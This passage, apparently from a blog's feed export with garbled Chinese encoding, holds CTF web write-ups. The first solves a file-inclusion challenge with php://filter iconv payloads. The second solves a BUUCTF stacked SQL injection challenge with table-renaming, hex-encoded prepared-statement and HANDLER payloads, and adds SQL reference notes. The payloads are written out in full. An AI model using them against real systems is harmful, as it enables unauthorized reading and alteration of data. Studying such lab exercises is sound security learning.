æ¯ã€‘" class="headerlink" title="2.file_includeã€æ±Ÿè‹å·¥åŒ æ¯ã€‘"></a>2.file_includeã€æ±Ÿè‹å·¥åŒ æ¯ã€‘</h2><h3 id="1-é¢˜ç›®æè¿°-25"><a href="#1-é¢˜ç›®æè¿°-25" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ€ä¹ˆè¯»å–æ–‡ä»¶å‘¢ï¼Ÿ</p><h3 id="2-wp-18"><a href="#2-wp-18" class="headerlink" title="2)wp"></a>2)wp</h3><p>è¿™æ˜¯ä¸€é“æ–‡ä»¶åŒ…å«çš„é¢˜ç›®</p><p>ä½†æ˜¯å¼€å§‹ä¸€ç›´ç”¨ä¼ªåè®®è¯»å–éƒ½å¤±è´¥</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">61.147</span>.<span class="number">171.105</span>:<span class="number">61462</span><span class="regexp">/?filename=php:/</span><span class="regexp">/filter/</span>read=convert.base64/resource=flag.php</span><br></pre></td></tr></table></figure><p><img src="/2022/06/21/Gongfang-wp/image-20230104221540491.png" alt="image-20230104221540491"></p><p>æ ¹æ®æºç çŒœæµ‹ï¼Œæ˜¯åœ¨<code>check.php</code>ä¸­è®¾ç½®äº†è¿‡æ»¤ï¼Œä½†æ˜¯ç›´æ¥è®¿é—®æ˜¯æ— æ³•å¾—åˆ°æ–‡ä»¶å†…å®¹çš„</p><p>è¿™é‡Œæ¶‰åŠåˆ°ä¸€ä¸ªçŸ¥è¯†ç‚¹</p><h4 id="Conversion-Filtersï¼ˆè½¬æ¢è¿‡æ»¤å™¨ï¼‰"><a href="#Conversion-Filtersï¼ˆè½¬æ¢è¿‡æ»¤å™¨ï¼‰" class="headerlink" title="Conversion Filtersï¼ˆè½¬æ¢è¿‡æ»¤å™¨ï¼‰"></a>Conversion Filtersï¼ˆè½¬æ¢è¿‡æ»¤å™¨ï¼‰</h4><p><code>Conversion Filters</code>ï¼ˆè½¬æ¢è¿‡æ»¤å™¨ï¼‰å¦‚åŒ <code>string.</code> è¿‡æ»¤å™¨ï¼Œ<code>convert.</code> è¿‡æ»¤å™¨çš„ä½œç”¨å°±å’Œå…¶åå­—ä¸€æ ·ã€‚è½¬æ¢è¿‡æ»¤å™¨æ˜¯ <code>PHP 5.0.0</code> æ·»åŠ çš„ã€‚</p><p>å¸¸ç”¨çš„<code>convert.base64</code>å°±æ˜¯å…¶åº”ç”¨</p><p>ä½†æ˜¯æˆ‘ä»¬è¿™é‡Œæµ‹è¯•å¯ä»¥çŸ¥é“</p><p><img src="/2022/06/21/Gongfang-wp/image-20230104222154684.png" alt="image-20230104222154684"></p><p>è¿™é‡Œå°†<code>base64</code>è¿‡æ»¤äº†ï¼Œä¹Ÿå°±æ˜¯ä¸èƒ½è¿›è¡Œ<code>base64</code>è½¬åŒ–ï¼Œ<code>read</code>ä¹Ÿä¸èƒ½ç”¨</p><p>äºæ˜¯è¿™é‡Œå°±æåŠäº†</p><h5 id="convert-iconv"><a href="#convert-iconv" class="headerlink" title="convert.iconv.*"></a>convert.iconv.*</h5><p>è¿™ä¸ªè¿‡æ»¤å™¨éœ€è¦ php æ”¯æŒ iconvï¼Œè€Œ iconv æ˜¯é»˜è®¤ç¼–è¯‘çš„ã€‚ä½¿ç”¨convert.iconv.*è¿‡æ»¤å™¨ç­‰åŒäºç”¨<code>iconv()</code>å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ®ã€‚</p><p>ä½¿ç”¨æ–¹æ³•</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">convert.iconv.&lt;<span class="keyword">input</span>-<span class="keyword">encoding</span>&gt;.&lt;output-<span class="keyword">encoding</span>&gt; </span><br><span class="line"><span class="keyword">or</span> </span><br><span class="line">convert.iconv.&lt;<span class="keyword">input</span>-<span class="keyword">encoding</span>&gt;/&lt;output-<span class="keyword">encoding</span>&gt;</span><br></pre></td></tr></table></figure><p>ç›¸æ¯”å•çº¯çš„<code>convert.</code>åŠ ä¸Š<code>.iconv</code>åï¼Œå¯ä»¥å°†æ•°æ®è¿›è¡Œè½¬åŒ–åï¼Œå†è¿›è¡Œè½¬åŒ–è¾“å‡º</p><p>è€Œå…¶èƒ½è¿›è¡ŒåŠ ç çš„æ–¹å¼æœ‰</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">UCS</span>-<span class="number">4</span>*</span><br><span class="line"><span class="attribute">UCS</span>-<span class="number">4</span>BE</span><br><span class="line"><span class="attribute">UCS</span>-<span class="number">4</span>LE*</span><br><span class="line"><span class="attribute">UCS</span>-<span class="number">2</span></span><br><span class="line"><span class="attribute">UCS</span>-<span class="number">2</span>BE</span><br><span class="line"><span class="attribute">UCS</span>-<span class="number">2</span>LE</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">32</span>*</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">32</span>BE*</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">32</span>LE*</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">16</span>*</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">16</span>BE*</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">16</span>LE*</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">7</span></span><br><span class="line"><span class="attribute">UTF7</span>-IMAP</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">8</span>*</span><br><span class="line"><span class="attribute">ASCII</span>*</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™äº›åŠ ç æ–¹å¼ä¹Ÿæœ‰äº›è¢«è¿‡æ»¤</p><p>è¿›è¡Œçˆ†ç ´å¾—åˆ°<code>UTF-7ï¼ŒUCS-4*</code>å¯ä»¥</p><p>ç›´æ¥æ„é€ </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">61.147</span>.<span class="number">171.105</span>:<span class="number">61462</span><span class="regexp">/?filename=php:/</span><span class="regexp">/filter/</span>convert.iconv.UTF-<span class="number">7</span>.UCS-<span class="number">4</span>*/resource=flag.php</span><br></pre></td></tr></table></figure><p>å¾—åˆ°<code>flag</code></p><p><img src="/2022/06/21/Gongfang-wp/image-20230104223717245.png" alt="image-20230104223717245"></p><hr><p>æŸ¥çœ‹ä¸€ä¸‹<code>check.php</code>å†…å®¹</p><p><img src="/2022/06/21/Gongfang-wp/image-20230104223436793.png" alt="image-20230104223436793"></p><p>å‘ç°è¿‡æ»¤äº†</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">base|<span class="type">be</span>|<span class="type">encode</span>|<span class="type">print</span>|<span class="type">zlib</span>|<span class="type">quoted</span>|<span class="type">write</span>|<span class="type">rot13</span>|<span class="type">read</span>|<span class="type">string</span></span><br><span class="line"></span><br><span class="line">çœ‹åˆ°è¿™é‡Œè¿‡æ»¤äº†quotedï¼Œstringï¼Œæ‰€ä»¥è¿™é‡Œçš„è½¬åŒ–è¿‡æ»¤å™¨å‡½æ•°ç”¨çš„iconv()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œå®‰å…¨å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é¶åœº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctfé¶åœºwp</title>
      <link href="/2022/06/21/buuctf-wp/"/>
      <url>/2022/06/21/buuctf-wp/</url>
      
        <content type="html"><![CDATA[<p><code>webå„ä¸ªæ–¹é¢é€‰æ‹©äº†ä¸€äº›é¢˜ç›®è¿›è¡Œå­¦ä¹ ï¼Œæ„Ÿè§‰è¿˜æ˜¯å¾—ç¬¬ä¸€æ¬¡å°±åº”è¯¥çœ‹é€šå½»ï¼Œä¸åº”è¯¥ç•™æœ‰é—®é¢˜ï¼Œèƒ½å¤Ÿæ˜ç™½åŸç†å’Œä»£ç ä¸­å“ªå‡ºé€ æˆè¿™ä¸ªçš„åŸå› ï¼Œåå¤åš¼å‰©é¥­æ„Ÿè§‰æµªè´¹æ—¶é—´</code></p><span id="more"></span><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="1-å¼ºç½‘æ¯-2019-éšä¾¿æ³¨"><a href="#1-å¼ºç½‘æ¯-2019-éšä¾¿æ³¨" class="headerlink" title="1.[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨"></a>1.[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</h2><h3 id="1ï¼‰é¢˜ç›®æè¿°"><a href="#1ï¼‰é¢˜ç›®æè¿°" class="headerlink" title="1ï¼‰é¢˜ç›®æè¿°"></a>1ï¼‰é¢˜ç›®æè¿°</h3><p>æ— </p><h3 id="2ï¼‰wp"><a href="#2ï¼‰wp" class="headerlink" title="2ï¼‰wp"></a>2ï¼‰wp</h3><p>å› ä¸ºä¹‹å‰æ²¡æœ‰äº†è§£è¿‡å †å æ³¨å…¥ï¼Œè¿™é‡ŒæŒ¨ä¸ªåˆ†æå­¦ä¹ </p><p>å…ˆæ¥ç¡®å®šsqlæ³¨å…¥</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2022/06/21/buuctf-wp/image-20220701113045499.png" alt="image-20220701113045499"></p><p>ç„¶åè¯•è¯•æ˜¾ç¤ºæ‰€æœ‰æ•°æ®ï¼Œæ„Ÿè§‰çœ‹ä¸åˆ°ä»€ä¹ˆæ„æ€ï¼Œåé¢ä¸€æ­¥æ­¥åˆ†æ</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27; or <span class="number">1</span>=<span class="number">1</span>;#</span><br></pre></td></tr></table></figure><p><img src="/2022/06/21/buuctf-wp/image-20220702105520465.png" alt="image-20220702105520465"></p><p>ç„¶ååˆ¤æ–­å­—æ®µ</p><p><img src="/2022/06/21/buuctf-wp/image-20220701113210998.png" alt="image-20220701113210998"></p><p><img src="/2022/06/21/buuctf-wp/image-20220701113228972.png" alt="image-20220701113228972"></p><p>åˆ¤æ–­å¤„å­—æ®µæ•°ä¸º2</p><p>ç„¶åç”¨<strong>è”åˆæ³¨å…¥</strong></p><p><img src="/2022/06/21/buuctf-wp/image-20220701113604165.png" alt="image-20220701113604165"></p><p>å‘ç°selectè¢«æ­£åˆ™åŒ¹é…è¿‡æ»¤äº†ï¼Œç”¨å¤§å°å†™ç»•è¿‡ä¹Ÿä¸è¡Œï¼Œæ‰€ä»¥åªèƒ½æ¢ä¸€ç§æ–¹æ³•</p><p>å¯ä»¥å…ˆäº†è§£<a href="../../../../2022/05/28/Web-study">å †å æ³¨å…¥</a>çš„æ¦‚å¿µå’Œæ³¨å…¥æ–¹å¼</p><h4 id="å †å æ³¨å…¥"><a href="#å †å æ³¨å…¥" class="headerlink" title="å †å æ³¨å…¥"></a><strong>å †å æ³¨å…¥</strong></h4><p>å…ˆæŸ¥çœ‹æ‰€æœ‰çš„æ•°æ®åº“</p><p><code>æ³¨ï¼šè¿™é‡Œä»ç„¶è¦æŸ¥è¯¢æ•°æ®ä¸ºå‡ï¼Œæ¯”å¦‚-1ï¼Œä¸ç„¶å°±ä¸ä¼šæ‰§è¡Œåé¢çš„sqlè¯­å¥</code></p><p><code>;é—´éš”sqlè¯­å¥</code></p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;;<span class="keyword">show</span> databases;<span class="meta">#</span></span><br></pre></td></tr></table></figure><p><img src="/2022/06/21/buuctf-wp/image-20220701224154901.png" alt="image-20220701224154901"></p><p>æ ¹æ®é¢˜ç›®åå­—ï¼Œå…ˆè°ƒç”¨supersqliè¿™ä¸ªåº“çš„è¡¨çœ‹çœ‹</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;;<span class="keyword">use</span> supersqli;<span class="keyword">show</span> tables;<span class="meta">#</span></span><br></pre></td></tr></table></figure><p><img src="/2022/06/21/buuctf-wp/image-20220701222551203.png" alt="image-20220701222551203"></p><p>çœ‹åˆ°æœ‰ä¸¤ä¸ªè¡¨ï¼Œå…ˆçœ‹ä¸€ä¸‹çº¯æ•°å­—çš„è¡¨é‡Œçš„å†…å®¹</p><p> <strong><u>æ³¨ï¼šå½“çº¯æ•°å­—å­—ç¬¦ä¸²æ˜¯è¡¨åçš„æ—¶å€™éœ€è¦åŠ åå¼•å·&#96;</u></strong></p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;;<span class="keyword">use</span> supersqli;<span class="keyword">show</span> columns from`<span class="number">1919810931114514</span>`;<span class="meta">#</span></span><br></pre></td></tr></table></figure><p><img src="/2022/06/21/buuctf-wp/image-20220701224603433.png" alt="image-20220701224603433"></p><p>çœ‹åˆ°flagåœ¨é‡Œé¢ï¼Œå†çœ‹çœ‹wordsé‡Œ</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;;use supersqli;show columns <span class="keyword">from</span> <span class="built_in">words</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="/2022/06/21/buuctf-wp/image-20220701233450179.png" alt="image-20220701233450179"></p><p><code>VARCHAR(M)æ˜¯ä¸€ç§æ¯”CHARæ›´åŠ çµæ´»çš„æ•°æ®ç±»å‹ï¼ŒåŒæ ·ç”¨äºè¡¨ç¤ºå­—ç¬¦æ•°æ®ï¼Œä½†æ˜¯VARCHARå¯ä»¥ä¿å­˜å¯å˜é•¿åº¦çš„å­—ç¬¦ä¸²</code></p><p>è¿™é‡ŒçŒœæµ‹ï¼Œå› ä¸ºflagæ˜¯å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥çŒœæµ‹è¾“å…¥æ¡†æŸ¥è¯¢çš„å°±æ˜¯wordsè¡¨</p><p>åå°sqlè¯­å¥å¯èƒ½ï¼ˆxxä¸ºè¾“å…¥æ¡†çš„å†…å®¹ï¼‰</p><p><code>select id,data from words where id=xx</code></p><hr><p>æ›´æ”¹è¡¨ååˆ—å</p><p>1ï¼Œé€šè¿‡ rename å…ˆæŠŠ words è¡¨æ”¹åä¸ºå…¶ä»–çš„è¡¨åã€‚</p><p>2ï¼ŒæŠŠ 1919810931114514 è¡¨çš„åå­—æ”¹ä¸º words ã€‚</p><p>3 ï¼Œç»™æ–° words è¡¨æ·»åŠ æ–°çš„åˆ—å id ã€‚</p><p>4ï¼Œå°† flag æ”¹åä¸º data ã€‚</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;;rename table `<span class="built_in">words</span>` <span class="keyword">to</span> words2;rename table `<span class="number">1919810931114514</span>` <span class="keyword">to</span> <span class="built_in">words</span>;alter table <span class="built_in">words</span> change flag <span class="built_in">id</span> varchar(<span class="number">100</span>);show tables;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><code>show tables</code>ä¸»è¦çœ‹çœ‹æ”¹æˆåŠŸæ²¡æœ‰ï¼Œè¿™é‡Œæ”¹è¡¨åè¦æœ‰é¡ºåºï¼Œå¦‚æœå…ˆæ”¹æ•°å­—è¡¨ï¼Œé‚£å°±å‡ºç°ä¸¤ä¸ªwordsè¡¨ï¼Œå¯¼è‡´è¯­å¥ä¸èƒ½æ‰§è¡Œï¼Œæ‰€ä»¥éœ€è¦å…ˆæ”¹wordsè¡¨åä¸ºå…¶ä»–åå­—ï¼Œç„¶åä¿®æ”¹æ•°å­—è¡¨ä¸ºwordsï¼›é¿å…å› ä¸ºåå­—è€Œå‘ç”Ÿå‘½ä»¤å†²çª</p><p><img src="/2022/06/21/buuctf-wp/image-20220702220112706.png" alt="image-20220702220112706"></p><p>å¯ä»¥çœ‹åˆ°è¡¨<code>1919810931114514</code>åå­—è¢«æ”¹æˆäº†å¯æŸ¥è¯¢è¡¨<code>words</code></p><p>å†çœ‹çœ‹wordsè¡¨çš„åˆ—ï¼Œflagå˜æˆäº†idï¼ŒNOå˜æˆäº†YES</p><p><img src="/2022/06/21/buuctf-wp/image-20220702220308651.png" alt="image-20220702220308651"></p><p>ç”¨<code>1&#39; and 1=1#</code></p><p>çœ‹çœ‹å›æ˜¾æ•°æ®</p><p><img src="/2022/06/21/buuctf-wp/image-20220702221617795.png" alt="image-20220702221617795"></p><p>å¾—åˆ°flag</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SQl</span>çš„<span class="keyword">rename</span></span><br><span class="line">ç”¨äºé‡å‘½åè¡¨å</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">SQL</span>çš„<span class="keyword">alter</span>ç”¨æ³•æ€»ç»“</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>ï¼šåˆ é™¤åˆ—</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> è¡¨å <span class="keyword">DROP</span> <span class="keyword">COLUMN</span> åˆ—å</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>ï¼šå¢åŠ åˆ—</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> è¡¨å <span class="keyword">ADD</span> <span class="keyword">COLUMN</span> åˆ—å å±æ€§ ã€çº¦æŸã€‘</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>ï¼šä¿®æ”¹åˆ—çš„ç±»å‹ä¿¡æ¯</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> è¡¨å CHANGE <span class="keyword">COLUMN</span> åˆ—å ã€æ–°ã€‘åˆ—å</span><br><span class="line">æ–°å±æ€§</span><br><span class="line"><span class="number">4</span>ï¼šé‡å‘½ååˆ—</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> è¡¨åå­— CHANGE <span class="keyword">COLUMN</span> åˆ—å æ–°åˆ—å å±æ€§</span><br><span class="line"></span><br><span class="line"><span class="number">5</span>ï¼šé‡å‘½åè¡¨</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> è¡¨å <span class="keyword">RENAME</span> <span class="keyword">TO</span> è¡¨æ–°å</span><br><span class="line"></span><br><span class="line"><span class="number">6</span>ï¼šåˆ é™¤è¡¨ä¸­ä¸»é”®</span><br><span class="line"></span><br><span class="line"><span class="keyword">Alter</span> <span class="keyword">TABLE</span> è¡¨å <span class="keyword">DROP</span> <span class="keyword">primary key</span></span><br><span class="line"></span><br><span class="line"><span class="number">7</span>ï¼šæ·»åŠ ä¸»é”®</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> è¡¨å <span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> çº¦æŸå <span class="keyword">PRIMARY KEY</span> (æ·»åŠ åˆ—)</span><br><span class="line"></span><br><span class="line"><span class="number">8</span>ï¼šæ·»åŠ ç´¢å¼•</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> è¡¨å <span class="keyword">ADD</span> <span class="keyword">index</span> ç´¢å¼•å (åˆ—å);</span><br><span class="line"></span><br><span class="line"><span class="number">9</span>ï¼šä¿®æ”¹åˆ—çš„å±æ€§</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> è¡¨å MODIFY <span class="keyword">COLUMN</span> è¦ä¿®æ”¹å±æ€§çš„åˆ—å æ–°å±æ€§;</span><br><span class="line"></span><br><span class="line">ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä¸æ¨èåœ¨å»ºè¡¨åå¯¹è¡¨è¿›è¡Œå¤§å¹…åº¦ä¿®æ”¹ï¼Œå¤§å¹…åº¦ä¿®æ”¹ææœ‰å¯èƒ½ä½¿è¡¨æ•°æ®ä¸¢å¤±ã€‚</span><br></pre></td></tr></table></figure><p>â€“</p><p>çœ‹äº†å…¶ä»–å¤§ä½¬çš„wpï¼Œè¿™é‡Œè¡¥å……ä¸¤ç§æ–¹æ³•</p><p><a href="https://blog.csdn.net/qq_44657899/article/details/103239145">åŸæ–‡é“¾æ¥</a></p><h4 id="è§£é¢˜æ€è·¯2ï¼šé¢„å¤„ç†ç»•è¿‡selecté™åˆ¶"><a href="#è§£é¢˜æ€è·¯2ï¼šé¢„å¤„ç†ç»•è¿‡selecté™åˆ¶" class="headerlink" title="è§£é¢˜æ€è·¯2ï¼šé¢„å¤„ç†ç»•è¿‡selecté™åˆ¶"></a><strong>è§£é¢˜æ€è·¯2ï¼š<a href="https://so.csdn.net/so/search?q=%E9%A2%84%E5%A4%84%E7%90%86&spm=1001.2101.3001.7020">é¢„å¤„ç†</a>ç»•è¿‡selecté™åˆ¶</strong></h4><p>å› ä¸ºselectè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥å…ˆå°†</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="symbol">` 1919810931114514 `</span></span><br></pre></td></tr></table></figure><p>è¿›è¡Œ16è¿›åˆ¶ç¼–ç </p><p>å†é€šè¿‡æ„é€ payloadå¾—</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">SeT</span><span class="variable">@a</span><span class="operator">=</span><span class="number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>;<span class="keyword">prepare</span> execsql <span class="keyword">from</span> <span class="variable">@a</span>;<span class="keyword">execute</span> execsql;#</span><br></pre></td></tr></table></figure><p>è¿›è€Œå¾—åˆ°flag</p><pre><code>prepareâ€¦fromâ€¦æ˜¯é¢„å¤„ç†è¯­å¥ï¼Œä¼šè¿›è¡Œç¼–ç è½¬æ¢ã€‚executeç”¨æ¥æ‰§è¡Œç”±SQLPrepareåˆ›å»ºçš„SQLè¯­å¥ã€‚SELECTå¯ä»¥åœ¨ä¸€æ¡è¯­å¥é‡Œå¯¹å¤šä¸ªå˜é‡åŒæ—¶èµ‹å€¼,è€ŒSETåªèƒ½ä¸€æ¬¡å¯¹ä¸€ä¸ªå˜é‡èµ‹å€¼ã€‚</code></pre><p><img src="https://img-blog.csdnimg.cn/20200125185407747.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h4 id="è§£é¢˜æ€è·¯3ï¼šhandlerç»•è¿‡"><a href="#è§£é¢˜æ€è·¯3ï¼šhandlerç»•è¿‡" class="headerlink" title="è§£é¢˜æ€è·¯3ï¼šhandlerç»•è¿‡"></a><strong>è§£é¢˜æ€è·¯3ï¼š<a href="https://so.csdn.net/so/search?q=handler&spm=1001.2101.3001.7020">handler</a>ç»•è¿‡</strong></h4><p>payloadï¼š</p><figure class="highlight julia"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;; handler <span class="string">`1919810931114514`</span> open as <span class="string">`a`</span>; handler <span class="string">`a`</span> read next;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200225203706719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h5 id="handleråŸºæœ¬ç”¨æ³•"><a href="#handleråŸºæœ¬ç”¨æ³•" class="headerlink" title="handleråŸºæœ¬ç”¨æ³•"></a>handleråŸºæœ¬ç”¨æ³•</h5><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">HANDLER tbl_name OPEN [ [AS] alias]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name <span class="keyword">READ</span> index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name <span class="keyword">READ</span> index_name &#123; FIRST | <span class="keyword">NEXT</span> | PREV | LAST &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name <span class="keyword">READ</span> &#123; FIRST | <span class="keyword">NEXT</span> &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">    </span><br><span class="line">HANDLER tbl_name CLOSE</span><br><span class="line"></span><br><span class="line">é€šè¿‡HANDLER tbl_name OPENæ‰“å¼€ä¸€å¼ è¡¨ï¼Œæ— è¿”å›ç»“æœï¼Œå®é™…ä¸Šæˆ‘ä»¬åœ¨è¿™é‡Œå£°æ˜äº†ä¸€ä¸ªåä¸ºtb1_nameçš„å¥æŸ„ã€‚</span><br><span class="line">é€šè¿‡HANDLER tbl_name <span class="keyword">READ</span> FIRSTè·å–å¥æŸ„çš„ç¬¬ä¸€è¡Œï¼Œé€šè¿‡<span class="keyword">READ</span> <span class="keyword">NEXT</span>ä¾æ¬¡è·å–å…¶å®ƒè¡Œã€‚æœ€åä¸€è¡Œæ‰§è¡Œä¹‹åå†æ‰§è¡Œ<span class="keyword">NEXT</span>ä¼šè¿”å›ä¸€ä¸ªç©ºçš„ç»“æœã€‚</span><br><span class="line">é€šè¿‡HANDLER tbl_name CLOSEæ¥å…³é—­æ‰“å¼€çš„å¥æŸ„ã€‚</span><br><span class="line"></span><br><span class="line">é€šè¿‡ç´¢å¼•å»æŸ¥çœ‹çš„è¯å¯ä»¥æŒ‰ç…§ä¸€å®šçš„é¡ºåºï¼Œè·å–è¡¨ä¸­çš„æ•°æ®ã€‚</span><br><span class="line">é€šè¿‡HANDLER tbl_name <span class="keyword">READ</span> index_name FIRSTï¼Œè·å–å¥æŸ„ç¬¬ä¸€è¡Œï¼ˆç´¢å¼•æœ€å°çš„ä¸€è¡Œï¼‰ï¼Œ<span class="keyword">NEXT</span>è·å–ä¸‹ä¸€è¡Œï¼ŒPREVè·å–å‰ä¸€è¡Œï¼ŒLASTè·å–æœ€åä¸€è¡Œï¼ˆç´¢å¼•æœ€å¤§çš„ä¸€è¡Œï¼‰ã€‚</span><br><span class="line"></span><br><span class="line">é€šè¿‡ç´¢å¼•åˆ—æŒ‡å®šä¸€ä¸ªå€¼ï¼Œå¯ä»¥æŒ‡å®šä»å“ªä¸€è¡Œå¼€å§‹ã€‚</span><br><span class="line">é€šè¿‡HANDLER tbl_name <span class="keyword">READ</span> index_name = valueï¼ŒæŒ‡å®šä»å“ªä¸€è¡Œå¼€å§‹ï¼Œé€šè¿‡<span 